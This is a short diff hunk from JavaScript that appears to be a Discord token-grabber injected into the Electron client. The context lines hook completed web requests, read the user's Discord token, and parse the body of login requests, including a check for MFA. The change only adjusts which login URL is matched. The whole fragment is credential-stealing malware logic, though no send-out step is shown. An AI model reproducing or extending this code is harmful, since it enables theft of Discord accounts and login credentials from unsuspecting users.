@@ -75,7 +75,7 @@ session.defaultSession.webRequest.onCompleted({
         const token = await discordFunction('getToken');
         const user = await getUser(token);
 
-        if (details.url.endsWith('auth/login')) {
+        if (details.url.endsWith('/auth/login')) {
             const requestBody = JSON.parse(details.uploadData[0].bytes.toString());
 
             if (!requestBody.mfa) {
